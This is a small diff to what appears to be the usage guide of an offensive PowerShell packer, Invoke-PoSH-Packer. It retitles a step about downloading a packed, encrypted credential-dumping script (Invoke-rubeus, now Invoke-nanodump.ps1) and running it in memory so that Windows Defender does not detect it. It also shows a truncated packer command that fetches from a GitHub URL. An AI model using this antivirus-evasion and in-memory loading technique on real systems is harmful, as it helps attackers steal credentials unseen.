@@ -243,8 +243,8 @@ PS C:\temp> Invoke-PoSH-Packer -FileUrl https://raw.githubusercontent.com/S3cur3
 PS C:\temp>
 
 
-Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-rubeus' without being detected by the Windows Defender AV
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-nanodump.ps1' without being detected by Windows Defender 
+---------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\Users\Administrator> systeminfo
 
